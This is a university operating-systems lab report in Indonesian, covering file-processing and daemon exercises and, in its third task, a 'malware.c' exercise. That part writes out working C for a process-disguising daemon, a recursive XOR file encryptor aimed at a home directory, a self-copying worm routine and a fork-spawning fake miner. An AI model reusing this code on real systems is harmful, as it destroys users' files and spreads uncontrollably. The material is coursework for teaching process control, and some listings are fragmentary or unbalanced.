# Praktikum Sisop Modul 2-2025-IT15

Anggota kelompok : 
- Putu Yudi Nandanjaya Wiraguna	5027241080
- Naruna Vicranthyo Putra Gangga	5027241105
- Az Zahrra Tasya Adelia	        5027241087

# soal_1
### a) Downloading the Clues
pertama-tama kita membuat file action.c yang dimana kalau dijalankan tanpa argumen tambahan akan mendownload dan langsung meng unzip file tersebut. Dan tambahkan juga fungsi agar menghapus file Clues.zip setelah diekstrak dan semisal saat dijalankan folder Clues sudah ada, maka tidak akan mendownload Clues.zip lagi.
```C
void download_and_unzip() {
    if (access("Clues", F_OK) == 0) {
        printf("[!] Folder Clues sudah ada. Lewati download.\n");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"wget", "--no-check-certificate", "-O", "Clues.zip",
                        "https://example.link.com/uc?id=example&export=download", NULL};
        execvp("wget", argv);
        perror("wget gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        char *argv[] = {"unzip", "Clues.zip", NULL};
        execvp("unzip", argv);
        perror("unzip gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    remove("Clues.zip");
    printf("[+] Clues.zip berhasil diunduh dan diekstrak.\n");
}
```

### b) Filtering the Files
buatlah function filtering dengan memindahkan file-file yang hanya dinamakan dengan 1 huruf dan 1 angka tanpa karakter spesial kedalam folder baru bernama Filtered. Disaat filtering, file yang tidak dipindahkan kedalam folder Filtered akan dihapus.
```C
void filter_files() {
    mkdir("Filtered", 0755);

    const char *dirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        DIR *d = opendir(dirs[i]);
        if (!d) {
            perror("Gagal membuka direktori");
            continue;
        }
        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (is_valid_file(entry->d_name)) {
                char src[256], dst[256];
                snprintf(src, sizeof(src), "%s/%s", dirs[i], entry->d_name);
                snprintf(dst, sizeof(dst), "Filtered/%s", entry->d_name);
                rename(src, dst);
            } else {
                char path[256];
                snprintf(path, sizeof(path), "%s/%s", dirs[i], entry->d_name);
                remove(path);
            }
        }
        closedir(d);
    }
    printf("[*] Filtering selesai.\n");
}
```
Struktur dalam folder Filtered seharusnya terlihat seperti ini:
```
1.txt
2.txt
3.txt
4.txt
5.txt
6.txt
a.txt
b.txt
c.txt
d.txt
e.txt
f.txt
```

### c) Combine the File Content
kemudian buatlah function combine untuk meletakkan semua isi dari file .txt yang sudah difiltering sebelumnya kedalam file baru Combine.txt dengan menggunakan FILE pointer, tetapi file yang sebelumnya bernama angka diurut sesuai 1-2-3-..., dan huruf a-b-c-..., saat di combine: ambil dari file angka lalu huruf lalu angka lalu huruf dan seterusnya.
```C
int compare_numeric(const void *a, const void *b) {
    int num_a = atoi(*(const char **)a);
    int num_b = atoi(*(const char **)b);
    return num_a - num_b;
}

int compare_alpha(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}

void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        perror("Gagal membuka direktori Filtered");
        return;
    }

    struct dirent *entry;
    char *numbers[100], *letters[100];
    int num_count = 0, let_count = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            if (strlen(entry->d_name) == 5 &&
                entry->d_name[1] == '.' &&
                entry->d_name[2] == 't' &&
                entry->d_name[3] == 'x' &&
                entry->d_name[4] == 't') {

                if (isdigit(entry->d_name[0])) {
                    numbers[num_count++] = strdup(entry->d_name);
                } else if (isalpha(entry->d_name[0])) {
                    letters[let_count++] = strdup(entry->d_name);
                }
            }
        }
    }
    closedir(dir);

    qsort(numbers, num_count, sizeof(char *), compare_numeric);
    qsort(letters, let_count, sizeof(char *), compare_alpha);

    FILE *out = fopen("Filtered/Combined.txt", "w");
    if (!out) {
        perror("Gagal membuat Combined.txt");
        return;
    }

    int max = num_count > let_count ? num_count : let_count;
    for (int i = 0; i < max; i++) {
        if (i < num_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(numbers[i]);
        }
        if (i < let_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(letters[i]);
        }
    }


    fclose(out);
    printf("[*] Combined.txt berhasil dibuat dan file .txt lainnya dihapus.\n");
}
```

### d) Decode the file
lalu buatlah function decode untuk decode string dari Combine.txt menggunakan Rot13 dan letakkan hasilnya kedalam file Decoded.txt.
```C
char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decode_file() {
    FILE *in = fopen("Filtered/Combined.txt", "r");
    FILE *out = fopen("Filtered/Decoded.txt", "w");
    if (!in || !out) {
        perror("Gagal membuka file untuk decode");
        return;
    }
    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }
    fclose(in);
    fclose(out);
    printf("[*] File didecode ke Decoded.txt\n");
}
```

### e) Password Check
ini adalah bentuk final dari action.c:
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>

void download_and_unzip() {
    if (access("Clues", F_OK) == 0) {
        printf("[!] Folder Clues sudah ada. Lewati download.\n");
        return;
    }

    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {"wget", "--no-check-certificate", "-O", "Clues.zip",
                        "https://drive.google.com/uc?id=1xFn1OBJUuSdnApDseEczKhtNzyGekauK&export=download", NULL};
        execvp("wget", argv);
        perror("wget gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    pid_t pid2 = fork();
    if (pid2 == 0) {
        char *argv[] = {"unzip", "Clues.zip", NULL};
        execvp("unzip", argv);
        perror("unzip gagal");
        exit(1);
    } else {
        wait(NULL);
    }

    remove("Clues.zip");
    printf("[+] Clues.zip berhasil diunduh dan diekstrak.\n");
}

int is_valid_file(const char *name) {
    return strlen(name) == 5 && isalnum(name[0]) && name[1] == '.' && name[2] == 't' && name[3] == 'x' && name[4] == 't';
}

void filter_files() {
    mkdir("Filtered", 0755);

    const char *dirs[] = {"Clues/ClueA", "Clues/ClueB", "Clues/ClueC", "Clues/ClueD"};
    for (int i = 0; i < 4; i++) {
        DIR *d = opendir(dirs[i]);
        if (!d) {
            perror("Gagal membuka direktori");
            continue;
        }
        struct dirent *entry;
        while ((entry = readdir(d))) {
            if (is_valid_file(entry->d_name)) {
                char src[256], dst[256];
                snprintf(src, sizeof(src), "%s/%s", dirs[i], entry->d_name);
                snprintf(dst, sizeof(dst), "Filtered/%s", entry->d_name);
                rename(src, dst);
            } else {
                char path[256];
                snprintf(path, sizeof(path), "%s/%s", dirs[i], entry->d_name);
                remove(path);
            }
        }
        closedir(d);
    }
    printf("[*] Filtering selesai.\n");
}

int compare_numeric(const void *a, const void *b) {
    int num_a = atoi(*(const char **)a);
    int num_b = atoi(*(const char **)b);
    return num_a - num_b;
}

int compare_alpha(const void *a, const void *b) {
    return strcmp(*(const char **)a, *(const char **)b);
}

void combine_files() {
    DIR *dir = opendir("Filtered");
    if (!dir) {
        perror("Gagal membuka direktori Filtered");
        return;
    }

    struct dirent *entry;
    char *numbers[100], *letters[100];
    int num_count = 0, let_count = 0;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            if (strlen(entry->d_name) == 5 &&
                entry->d_name[1] == '.' &&
                entry->d_name[2] == 't' &&
                entry->d_name[3] == 'x' &&
                entry->d_name[4] == 't') {

                if (isdigit(entry->d_name[0])) {
                    numbers[num_count++] = strdup(entry->d_name);
                } else if (isalpha(entry->d_name[0])) {
                    letters[let_count++] = strdup(entry->d_name);
                }
            }
        }
    }
    closedir(dir);

    qsort(numbers, num_count, sizeof(char *), compare_numeric);
    qsort(letters, let_count, sizeof(char *), compare_alpha);

    FILE *out = fopen("Filtered/Combined.txt", "w");
    if (!out) {
        perror("Gagal membuat Combined.txt");
        return;
    }

    int max = num_count > let_count ? num_count : let_count;
    for (int i = 0; i < max; i++) {
        if (i < num_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", numbers[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(numbers[i]);
        }
        if (i < let_count) {
            char path[256];
            snprintf(path, sizeof(path), "Filtered/%s", letters[i]);
            FILE *f = fopen(path, "r");
            if (f) {
                int ch;
                while ((ch = fgetc(f)) != EOF)
                    fputc(ch, out);
                fclose(f);
                remove(path);
            }
            free(letters[i]);
        }
    }


    fclose(out);
    printf("[*] Combined.txt berhasil dibuat dan file .txt lainnya dihapus.\n");
}


char rot13(char c) {
    if ('a' <= c && c <= 'z') return 'a' + (c - 'a' + 13) % 26;
    if ('A' <= c && c <= 'Z') return 'A' + (c - 'A' + 13) % 26;
    return c;
}

void decode_file() {
    FILE *in = fopen("Filtered/Combined.txt", "r");
    FILE *out = fopen("Filtered/Decoded.txt", "w");
    if (!in || !out) {
        perror("Gagal membuka file untuk decode");
        return;
    }
    char c;
    while ((c = fgetc(in)) != EOF) {
        fputc(rot13(c), out);
    }
    fclose(in);
    fclose(out);
    printf("[*] File didecode ke Decoded.txt\n");
}

int main(int argc, char *argv[]) {
    if (argc == 1) {
        download_and_unzip();
    } else if (argc == 3 && strcmp(argv[1], "-m") == 0) {
        if (strcmp(argv[2], "Filtered") == 0) {
            filter_files();
        } else if (strcmp(argv[2], "Combine") == 0) {
            combine_files();
        } else if (strcmp(argv[2], "Decode") == 0) {
            decode_file();
        } else {
            fprintf(stderr, "Argumen tidak dikenali.\n");
            return 1;
        }
    } else {
        fprintf(stderr, "Usage:\n");
        fprintf(stderr, "  ./action              # untuk download Clues.zip\n");
        fprintf(stderr, "  ./action -m Filtered  # untuk filter file\n");
        fprintf(stderr, "  ./action -m Combine   # untuk gabungkan file\n");
        fprintf(stderr, "  ./action -m Decode    # untuk decode ROT13\n");
        return 1;
    }
    return 0;
}
```
setelah melakukan semuanya, kita mendapatkan password untuk di input ke cyrus
![image](https://github.com/user-attachments/assets/228f7f14-99c1-42d4-9d32-63fe078be647)

kendala: tidak ada

screenshot saat ./action:

![Screenshot 2025-04-17 195551](https://github.com/user-attachments/assets/226cda16-b223-41c2-a88a-be929c8d8f8d)

screenshot saat ./action -m Filtered:

![Screenshot 2025-04-17 195626](https://github.com/user-attachments/assets/44a486a4-c71a-4552-8942-ec8f763275ce)

screenshot saat ./action -m Combine:

![Screenshot 2025-04-17 195700](https://github.com/user-attachments/assets/fb71f9eb-8f19-4cd0-9792-2cf17184e20b)

screenshot saat ./action -m Decode:

![Screenshot 2025-04-17 195729](https://github.com/user-attachments/assets/d00ab73e-aed8-4d01-80fd-37574bb09592)

# Soal_2
### a) Download & Unzip Starter Kit
Implementasi:
Meskipun tidak ada kode download/unzip, program menyiapkan direktori starter_kit untuk menampung hasil unzip.
maka kita harus menjalankan:
 1. wget "https://drive.usercontent.google.com/u/0/uc?id=1_5GxIGfQr3mNKuavJbte_AoRkEQLXSKS&export=download" -O starter_kit.zip
 2. mkdir -p starter_kit &&  unzip starter_kit.zip -d starter_kit
 3. rm starter_kit.zip (setelah berhasil di unzip, hapus file zip yang masih tersedia dengan perintah tsb)

berikut contohnya:
![image](https://github.com/user-attachments/assets/c9f10e48-6e9a-4f6f-91a9-b81e5bf9fc5c)
![image](https://github.com/user-attachments/assets/3798f202-406f-4d6e-b288-74a2871d3028)

### b) Dekripsi Nama File dengan Base64 (Daemon)
Fungsi Penting:
-start_decrypt_daemon(): Menjalankan proses daemon untuk memantau direktori karantina.
![image](https://github.com/user-attachments/assets/91ee6ec5-5559-4eae-88f5-2af186f7a848)


    int attempts = 0;
    while (1) {
        int processed = process_quarantine();
        if (processed == 0) {
            if (++attempts >= 3) { // Cek 3 kali berturut-turut
                log_activity("Tidak ada file baru. Daemon berhenti.");
                break;
            }
        } else {
            attempts = 0;
        }
        sleep(5);
    }
    remove(".quarantine.pid");
}

-base64_decode(): Algoritma dekripsi Base64.

![image](https://github.com/user-attachments/assets/e4aa152d-64c3-49d8-b812-6ed007732921)
    
    while (input[i]) {
        while (input[i] && base64_char_value(input[i]) == -1 && input[i] != '=') i++;
        
        for (int k = 0; k < 4; k++) {
            if (input[i] == '=') {
                pad++;
                val[k] = 0;
            } else {
                val[k] = base64_char_value(input[i]);
            }
            i++;
        }
        
        output[j++] = (val[0] << 2) | ((val[1] & 0x30) >> 4);
        if (pad < 2) output[j++] = ((val[1] & 0x0F) << 4) | ((val[2] & 0x3C) >> 2);
        if (pad < 1) output[j++] = ((val[2] & 0x03) << 6) | val[3];
    }
    output[j] = '\0';
    return j;
}
-process_quarantine(): Memproses semua file di direktori karantina untuk didekripsi.

![image](https://github.com/user-attachments/assets/c5beb106-40a6-4f95-90db-cdf3305e984d)

    int count = 0;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[4096];
            snprintf(filepath, sizeof(filepath), "quarantine/%s", entry->d_name);
            count += rename_decrypted_file(filepath);
        }
    }
    closedir(dir);
    return count;
}


Cara Kerja:
Daemon akan berjalan di background (detached process). Proses daemon akan berjalan di background dan memantau direktori quarantine setiap 5 detik. File di quarantine dengan nama terenkripsi Base64 akan di-dekripsi otomatis. 

Contoh penggunaan: ./starterkit --decrypt

### c) Memindahkan File Antar Direktori
Fitur:
--quarantine: Pindahkan file dari starter_kit ke quarantine dengan nama di-encode Base64.
--return: Kembalikan file dari quarantine ke starter_kit dengan nama di-decode.

Fungsi:
move_to_quarantine(): Encode nama file ke Base64 sebelum dipindahkan.

![image](https://github.com/user-attachments/assets/f7e73c0f-7670-48f7-b97d-ecd7848009b0)

    DIR *dir = opendir("starter_kit");
    if (!dir) {
        log_activity("Direktori starter_kit tidak ditemukan");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char src[4096], dest[4096];
            snprintf(src, sizeof(src), "starter_kit/%s", entry->d_name);

            // Encode nama file ke Base64
            char encoded[4096];
            base64_encode((unsigned char *)entry->d_name, strlen(entry->d_name), encoded);

            snprintf(dest, sizeof(dest), "quarantine/%s", encoded);

            if (rename(src, dest) == 0) {
                log_activity("File dipindah: %s → quarantine/%s", entry->d_name);
            } else {
                log_activity("Gagal memindahkan: %s", entry->d_name);
            }
        }
    }
    closedir(dir);
}


move_from_quarantine_to_starter_kit(): Decode nama file saat dikembalikan.

![image](https://github.com/user-attachments/assets/afcfd7a3-d3ab-4116-a8f4-8605c77885b0)

    DIR *dir = opendir("quarantine");
    if (!dir) {
        log_activity("Direktori quarantine tidak ditemukan");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char src[4096], dest[4096];
            snprintf(src, sizeof(src), "quarantine/%s", entry->d_name);

            // Decode nama file dari Base64
            char decoded[4096];
            if (is_valid_base64(entry->d_name)) {
                base64_decode(entry->d_name, decoded);
            } else {
                strncpy(decoded, entry->d_name, sizeof(decoded));
                decoded[sizeof(decoded) - 1] = '\0';
            }

            snprintf(dest, sizeof(dest), "starter_kit/%s", decoded);

            if (rename(src, dest) == 0) {
                log_activity("File dikembalikan: %s → %s", decoded);
            } else {
                log_activity("Gagal mengembalikan: %s", entry->d_name);
            }
        }
    }
    closedir(dir);
}

Contoh penggunaan: ./starterkit --quarantine dan ./starterkit --return

### d) Menghapus File di Karantina (--eradicate)
Fungsi:
eradicate_quarantine(): Menghapus semua file di direktori quarantine. *Menggunakan unlink() untuk menghapus file.

![image](https://github.com/user-attachments/assets/eae0f7dc-3fb7-4e35-bcef-dab963ee8c2a)

    DIR *dir = opendir("quarantine");
    if (!dir) {
        log_activity("Gagal membuka direktori karantina");
        return;
    }

    struct dirent *entry;
    int deleted_count = 0;
    
    while ((entry = readdir(dir)) != NULL) {
        // Hanya proses file regular, skip direktori dan special files
        if (entry->d_type == DT_REG) {
            char filepath[4096];
            snprintf(filepath, sizeof(filepath), "quarantine/%s", entry->d_name);
            
            if (unlink(filepath) == 0) {
                log_activity("File dihapus: %s", entry->d_name);
                deleted_count++;
            } else {
                log_activity("Gagal menghapus: %s (Error: %s)", entry->d_name, strerror(errno));
            }
        }
    }
    closedir(dir);

    log_activity("Penghapusan selesai. Total file dihapus: %d", deleted_count);
}

contoh penggunaan: ./starterkit --eradicate

Log aktivitas akan tercatat di activity.log.

![image](https://github.com/user-attachments/assets/dd15c984-d6e9-4b7d-a6b7-fc66b53d95d6)

### e) Mematikan Proses Daemon
Fungsi:
shutdown_program(): Membaca PID dari file .quarantine.pid dan mengirim sinyal SIGTERM ke proses daemon. * terdapat Error handling juga yaitu: Cek keberadaan proses sebelum terminasi.

![image](https://github.com/user-attachments/assets/1bceb586-a1af-4f87-9b64-d3a2ee1c2189)

    int pid;
    if (fscanf(pid_file, "%d", &pid) != 1) {
        log_activity("Shutdown gagal: Format PID tidak valid");
        printf("File PID korup\n");
        fclose(pid_file);
        return;
    }
    fclose(pid_file);

    // Cek apakah proses benar-benar ada
    if (kill(pid, 0) == -1) {
        if (errno == ESRCH) {
            log_activity("Shutdown gagal: Proses %d tidak ditemukan", pid);
            printf("Proses tidak aktif\n");
        } else {
            log_activity("Shutdown gagal: Gagal cek proses %d (%s)", pid, strerror(errno));
        }
        remove(".quarantine.pid");
        return;
    }

    if (kill(pid, SIGTERM) == 0) {
        log_activity("Daemon dimatikan (PID: %d)", pid);
        printf("Daemon dimatikan (PID: %d)\n", pid);
        remove(".quarantine.pid");
    } else {
        log_activity("Shutdown gagal: Gagal mengirim sinyal ke %d (%s)", pid, strerror(errno));
        printf("Gagal mematikan daemon\n");
    }
}

Contoh penggunaan: ./starterkit --shutdown

### f. Error Handling
Implementasi:
-Validasi argumen command line.

![image](https://github.com/user-attachments/assets/d9437693-2784-4156-9faa-604f1eb159cb)

>> Memastikan jumlah argumen tepat (2: nama program + 1 opsi).
Jika tidak, program menampilkan pesan error dan keluar.

-Pengecekan keberadaan direktori (stat("quarantine", &st)).

![image](https://github.com/user-attachments/assets/dddd443c-46e1-4311-bcd0-c4c4b30a0649)

    DIR *dir = opendir("starter_kit");
    if (!dir) {
        log_activity("Direktori starter_kit tidak ditemukan");
        return;
    }
    // ...
}

>> Mengecek keberadaan direktori starter_kit sebelum operasi pemindahan file. Jika direktori tidak ada, error dicatat di log dan fungsi berhenti.

-Penanganan kesalahan sistem (e.g., rename(), unlink()).

![image](https://github.com/user-attachments/assets/b09e1389-038c-4df6-9efc-e34d7ddff814)


    int pid;
    if (fscanf(pid_file, "%d", &pid) != 1) {
        log_activity("Shutdown gagal: Format PID tidak valid");
        printf("File PID korup\n");
        fclose(pid_file);
        return;
    }
    // ...
}

>> Mengecek apakah file PID ada dan berformat benar. Jika file tidak ada atau korup, error dicatat di log.

-Validasi format Base64 dengan is_valid_base64()

![image](https://github.com/user-attachments/assets/e244f187-8e1e-4bac-a4fa-1ba8609dde2f)

>> Memvalidasi nama file di direktori karantina sebelum dekripsi. Jika format Base64 tidak valid, file diabaikan.

-Penanganan Gagal Hapus File

![image](https://github.com/user-attachments/assets/962d1f94-e49c-478d-ad96-9ff2e70b3d06)

>> Jika penghapusan file gagal, penyebab error ditulis ke log (e.g., permission denied). Menggunakan strerror(errno) untuk deskripsi error yang jelas.

-Pengecekan Buffer Overflow

![image](https://github.com/user-attachments/assets/358033f8-a764-484c-9c7c-226eda806431)

>>Mengecek panjang nama file hasil dekripsi untuk mencegah buffer overflow.

### contoh output struktur direktori

![image](https://github.com/user-attachments/assets/68189a6e-9b52-4edc-b9c5-67e4829cb968)

### kendala 
mengalami looping daemon tak tentu hingga ribuan line pada activity.log

![image](https://github.com/user-attachments/assets/b82a8e73-e5c6-4d4b-86a4-0073eaef1978)

# Soal_3
### a)
Buatlah malware.c yang akan bekerja secara daemon dan mengubah namanya menjadi /init.
```C
void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}
```
### b)
Lalu buatlah anak fitur pertama yang akan memindai directory saat ini dan mengenkripsi file dan folder menggunakan xor dengan timestamp saat dijalankan.
```C
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### c)
Setelah itu buat anak fitur kedua yang akan menyebarkan malware ini dengan cara membuat salinan binary malware di setiap directory yang ada di home.
```C
void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
        }
        exit(EXIT_SUCCESS);
    }
}
```
### d)
Anak fitur pertama dan kedua harus berjalan berulang ulang dengan interval 30 detik.
```C
// Kedua child ditambahkan sleep(30) agar ada interval
void child_1(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "encryptor", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "encryptor", len);
        }

        unsigned int key = (unsigned int)time(NULL);
        while (1) {
            encrypt("/home/isolate", key);
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}

void child_2(int argc, char **argv) {
    pid_t child = fork();
    if (child < 0) exit(EXIT_FAILURE);
    if (child == 0) {
        prctl(PR_SET_NAME, "trojan.wrm", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "trojan.wrm", len);
        }

        while (1) {
            copy_self_recursive("/home/target");
            sleep(30);
        }
        exit(EXIT_SUCCESS);
    }
}
```
### e)
Tambahkan anak fitur ketiga yang akan membuat sebuah fork bomb di dalam perangkat.
```C
void child_3(int argc, char **argv) {
    pid_t rodok = fork();
    if (rodok < 0) exit(EXIT_FAILURE);
    if (rodok == 0) {
        prctl(PR_SET_NAME, "rodok.exe", 0, 0, 0);

        if (argc > 0) {
            size_t len = 64;
            memset(argv[0], 0, len);
            strncpy(argv[0], "rodok.exe", len);
        }

        srand(time(NULL));
        int max_miner = sysconf(_SC_NPROCESSORS_ONLN);
        if (max_miner < 3) max_miner = 3;

        for (int i = 0; i < max_miner; i++) {
            pid_t miner = fork();
            if (miner == 0) {
                mine_worker(i, argc, argv);
                exit(EXIT_SUCCESS);
            }
        }

        while (1) sleep(60);
        exit(EXIT_SUCCESS);
    }
}
```
### f)
Setelah itu tambahkan fitur pada fork bomb tadi dimana setiap fork dinamakan mine-crafter-XX dan akan melakukan cryptomining(cryptomining yang dimaksud adalah membuat sebuah hash hexadecimal (base 16) random sepanjang 64 char). Masing masing hash dibuat secara random dalam rentang waktu 3 detik - 30 detik.
```C
char *generate_hash() {
    static char charset[] = "0123456789abcdef";
    static char hash[65];
    for (int i = 0; i < 64; i++) {
        hash[i] = charset[rand() % 16];
    }
    hash[64] = '\0';
    return hash;
}

void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

// Seed unik untuk setiap worker
  srand(time(NULL) ^ (getpid() + id));

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

      }
  }
}
```
### g)
mine-crafter-XX akan mengumpulkan hash yang sudah dibuat dan menyimpannya di dalam file /tmp/.miner.log
```C
void mine_worker(int id, int argc, char **argv) {
  prctl(PR_SET_PDEATHSIG, SIGTERM);

  char procname[64];
  snprintf(procname, sizeof(procname), "mine-crafter-%d", id);
  prctl(PR_SET_NAME, procname, 0, 0, 0);

  if (argc > 0) {
      size_t len = 64;
      memset(argv[0], 0, len);
      strncpy(argv[0], procname, len);
  }

  srand(time(NULL) ^ (getpid() + id)); 

  while (1) {
      int delay = (rand() % 28) + 3;
      sleep(delay);

      time_t now = time(NULL);
      struct tm *t = localtime(&now);

      char logline[128];
      snprintf(logline, sizeof(logline), "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
               t->tm_year + 1900, t->tm_mon + 1, t->tm_mday,
               t->tm_hour, t->tm_min, t->tm_sec,
               id, generate_hash());

//Output dari mine-crafter-XX akan disimpan di file /tmp/.miner.log
      FILE *log = fopen("/tmp/.miner.log", "a");
      if (log) {
          fputs(logline, log);
          fclose(log);
      }
  }
}
```
### h)
Terakhir, tambahkan fitur dimana jika rodok.exe dimatikan, maka seluruh mine-crafter-XX juga akan mati.

#### Struktur akhir dari malware.c
```C
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <sys/prctl.h>
#include <time.h>
#include <dirent.h>
#include <limits.h>
#include <signal.h>

extern char **environ;

void create_daemon() {
    pid_t pid, sid;

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);

    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);

    if ((chdir("/")) < 0) exit(EXIT_FAILURE);

    for (int x = sysconf(_SC_OPEN_MAX); x >= 0; x--) {
        close(x);
    }
}

void menyamarkan_process(int argc, char **argv) {
    environ = NULL;
    prctl(PR_SET_NAME, "/soal_3", 0, 0, 0);

    if (argc > 0) {
        size_t len = 64;
        memset(argv[0], 0, len);
        strncpy(argv[0], "/soal_3", len);
    }
}

void xorfile(const char *filename, unsigned int key) {
    char tmp_filename[512];
    snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);

    FILE *in = fopen(filename, "rb");
    FILE *out = fopen(tmp_filename, "wb");

    if (!in || !out) {
        perror("File error");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmp_filename, filename);
}

void encrypt(const char *path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt(fullpath, key);
        } else if (S_ISREG(st.st_mode)) {
            xorfile(fullpath, key);
        }
    }
    closedir(dir);
}

void copy_self_recursive(const char *dirpath) {
    DIR *dir = opendir(dirpath);
    if (!dir) return;

    struct dirent *entry;
    char path[PATH_MAX];

    char exe_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len == -1) {
        perror("readlink");
        closedir(dir);
        return;
    }
    exe_path[len] = '\0';

    const char *filename = strrchr(exe_path, '/');
    filename = filename ? filename + 1 : exe_path;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(path, sizeof(path), "%s/%s", dirpath, entry->d_name);

        struct stat st;
        if (stat(path, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            copy_self_recursive(path);
        }
    }

    char target_path[PATH_MAX];
    snprintf(target_path, sizeof(target_path), "%s/%s", dirpath, filename);

    FILE *src = fopen(exe_path, "rb");
    FILE *dest = fopen(target_path, "wb");

    if (!src || !dest) {
        perror("copy error");
        if (src) fclose(src);
        if (dest) fclose(dest);
        closedir(dir);
        return;
    }

    char buffer[4096];
    size_t n;
    while ((n = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, n, dest);
    }

